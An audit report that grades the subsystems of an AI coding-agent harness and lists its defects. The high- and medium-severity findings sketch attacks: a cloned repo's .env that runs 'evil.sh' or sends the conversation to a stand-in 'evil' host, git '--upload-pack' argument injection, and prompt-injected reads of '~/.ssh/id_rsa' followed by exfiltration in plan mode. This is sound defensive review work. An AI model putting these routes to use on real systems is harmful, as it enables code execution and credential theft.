# Codebase Review — marim-harness (excluding `interfaces/`)

**Date:** 2026-07-03 (second review of the day; snapshot at `4dd6ce4` + working tree: SpawnWorktree/SpawnTranscripts extractions in flight)
**Overall grade: 7.5 / 10**

Seven parallel subsystem audits, each reading its scope in full and probing adversarial
cases (several findings verified live). Scope: everything under `src/marim_harness/`
except `interfaces/` (~18.2k source lines), plus tests, CI, packaging, docs.

## Scorecard

| Subsystem | Score | One-line verdict |
|---|---|---|
| Root modules + project health (atomic_io, images, notifications, CI, tests, docs) | 8.5 | atomic_io is textbook-correct; CI/typing/test culture at the exemplary bar |
| `runtime/` (harness, controller, deps, errors, …) | 8 | Resumability defended at three layers; checkpoint/sanitize ordering bug and steer-reclaim conflation hide in the ~300-line turn braid |
| `subagents/` (runner, cli_backend, demux, isolation, persistence) | 8 | Hard problems (nested spawns, resume-across-death, demux) solved with pinned invariants; one branch-destroying resume path |
| `session/` + compaction + jobs | 8 | Crash-corruption designed out; torn `switch_session` can overwrite the target session file |
| `workspace/` + `hooks/` + `lsp/` | 7.5 | Exemplary snapshot safety engineering, but verified rewind defects and an ungated skills/agents prompt-injection surface |
| `tools/` + command policy | 7 | Honest threat model, strong SSRF work; verified crash on any ≥64 KiB output line; plan-mode exfiltration channel |
| `config/` + `mcp/` + `plugins/` | 7 | Meticulous within its threat model; two outright trust-gate bypasses (`.env` provider smuggling → RCE, git argument injection) |

## Objective baseline

- ruff (`E,F,I,UP,B,SIM`) clean on src+tests; pyright standard mode: 0 errors.
- 2,462 tests / 159 files; ~40.6k test lines vs ~27.8k src (1.46:1); 90% coverage enforced.
- Test culture is behavioral: 52 files drive real agent runs via TestModel/FunctionModel; only 4 use MagicMock.
- Zero private-attribute access into pydantic_ai from src (excluding interfaces); bounded `>=1.107,<2` pin. One queued deprecation (`MCPServerStdio` removed in v2).
- CI: 3.10/3.12/3.14 matrix in the documented ruff→pyright→pytest order + `uv build` check.

## Cross-cutting strengths

- **Invariant documentation is the best feature of this codebase.** Nearly every
  non-obvious invariant (resumability, rollback baselines, cache stability, ref
  namespacing, mask monotonicity) is commented with the concrete failure it prevents,
  and most are pinned by a targeted test. Multiple reviewers independently called it
  the best-documented invariant-heavy code they'd seen.
- **Persistence is genuinely atomic**: same-dir unique temps, file+dir fsync,
  `os.replace`, advisory sidecar locks, grace-windowed temp sweeps.
- **Destructive git paths are layered-safe**: `refs/marim/` namespace guards on write
  and delete, NUL-delimited parsing, throwaway index, pre-restore safety snapshots
  with refusal-on-failure.
- **Failure-path discipline**: usage banked on aborted runs, consumables restored
  once, CancelledError never swallowed, hooks never raise into a turn.

## High-severity findings (fix first)

1. **RCE via project `.env` provider smuggling** — `config/env.py:51-62` blocklist
   misses `MARIM_PROVIDER` / `MARIM_CLAUDE_CLI_BIN` / `MARIM_BASE_URL` / `MARIM_API_KEY`.
   A cloned repo ships `.env` with `MARIM_PROVIDER=claude-cli` +
   `MARIM_CLAUDE_CLI_BIN=.marim/evil.sh` (`shutil.which` resolves separator paths) →
   first model request executes the attacker's binary, bypassing the entire
   `MARIM_TRUST_PROJECT_HOOKS` gate. Softer variant: `MARIM_BASE_URL=https://evil/v1`
   exfiltrates the whole conversation.
2. **Git argument injection from the project plugin registry** —
   `plugins/install.py:66-85, 226-244`: no `--` separator, no `-`-prefix validation on
   url/ref. A committed `.marim/plugins/plugins.json` entry with
   `"url": "--upload-pack=<cmd>"` executes on `marim plugin update`.
3. **`run_bash` crashes on any single output line ≥ 64 KiB** (verified live) —
   `shell.py:114/155/263/291`: `create_subprocess_shell` without `limit=` →
   `readline()` raises ValueError, blowing up the turn instead of returning capped
   output. `cat bundle.min.js` or `jq -c .` is enough. (cli_backend.py already fixed
   this exact bug for its own stream — `_iter_ndjson_lines`.)
4. **Resumed isolated spawn's branch destroyed on build failure** —
   `subagents/runner.py:673-676`: `_prepare_spawn` calls `iso.discard()` (deletes the
   branch holding prior work) before the resume call site's keep-the-branch teardown
   runs. Needs a fresh-vs-resumed flag.

## Medium findings (thematic)

**Security/trust posture** (the trust story is strong but has three inconsistent edges):
- Plan-mode exfiltration: `is_read_only` permits host-wide reads
  (`cat ~/.ssh/id_rsa`) and `fetch_url`/`web_search` are never gated → prompt-injected
  read-and-exfiltrate with zero approvals in "read-only" plan mode.
- Project `.marim/skills` and `.marim/agents` load with **no trust gate**
  (skills.py:218, agents.py:397) — system-prompt injection from a cloned repo, while
  hooks/MCP are gated.
- Registry/CLI plugin names never checked against `valid_plugin_name` →
  `remove_plugin` rmtree traversal (`plugins/state.py:62-77`).
- claude-cli maps marim's `ask` mode silently to `acceptEdits` — edits with no gating
  while the UI says "ask" (`claude_cli_model.py:396-409`).
- macOS notification AppleScript injection: backslashes unescaped before quotes
  (`notifications.py:198-201`), and notifications default **on** while the docstring
  claims opt-in.

**Correctness/state**:
- `switch_session` rebinds the store before load; a corrupt target leaves torn state
  and the next persist writes session A's history over session B's file
  (`session/ctrl.py:335-340`).
- Checkpoint snapshotted before turn-start history sanitize/repair mutates length →
  stale `history_len`, `/rewind` can slice mid tool-call pair
  (`runtime/controller.py:741 vs 779`).
- Steer reclaim matches by text against the whole history — a steer equal to any
  earlier user message ("yes", "continue") is silently dropped
  (`controller.py:455-478`).
- Abandoned 0.25s-timeout persist thread can complete after a newer write and clobber
  it (`controller.py:343-346`).
- Rewind is broken once any spawn worktree exists: `.worktrees/<branch>` staged as a
  gitlink vs reported with trailing slash → `_remove_extra_files` unlink OSError →
  `restore()` returns False forever (verified; `snapshot.py:174-182`). Also: capture
  silently dead without git identity (`snapshot.py:147` — worktree.py solved this,
  snapshot.py didn't), and ignored-at-capture files can be silently deleted on restore
  if `.gitignore` changed (`snapshot.py:195-213`).
- Compaction gate uses chars/4 estimate when the provider-reported `input_tokens` is
  on hand; no post-compaction budget check → wedge-until-`/clear` corner
  (`compaction.py:51-73, 124-145`).
- Empty `old_string` in edit → "set replace_all" retry guidance → `text.replace("", …)`
  corrupts the whole file (`tools/fs.py:239-253`).
- No timeout on the claude-cli subprocess; a hung CLI holds a concurrency slot forever
  (`cli_backend.py:448-531`). Ctrl-C on a fresh isolated foreground spawn destroys
  strictly more than a kill -9 (`runner.py:749-756`).
- MCP connect retry after interrupt re-appends already-live servers → duplicate tool
  names (`mcp/manager.py:216-267`). LSP `aclose()` doesn't cancel in-flight starts →
  leaked server process (`lsp/manager.py:221-228`); no crashed-server recovery.
- Stale session-store model silently overrides fresh `MARIM_MODEL`/.env on new
  sessions (`runtime/bootstrap.py:80-84`) — a known real-world footgun, undocumented.

Low-severity items (doc drift, unbounded caches, lock-file accumulation, cosmetic
inconsistencies) are enumerated in the per-subsystem agent reports and omitted here.

## Grade rationale

**7.5/10.** The engineering culture is well above solid-professional: invariants are
modeled, documented with their failure modes, and tested behaviorally at a depth most
production codebases never reach; persistence, destructive git paths, and the
resumability story are genuinely hard problems handled with layered rigor. What holds
it back from 8+ is that the *security* rigor is uneven relative to the *correctness*
rigor: the trust model is thoughtfully designed yet bypassable outright in two places
(both highs), plan mode leaks, and skills/agents skip the gate entirely — plus a
handful of verified user-facing defects (64 KiB crash, rewind-broken-after-spawn,
torn session switch) in exactly the high-stakes paths. Fixing the four highs and the
snapshot/switch defects would credibly move this to 8–8.5.
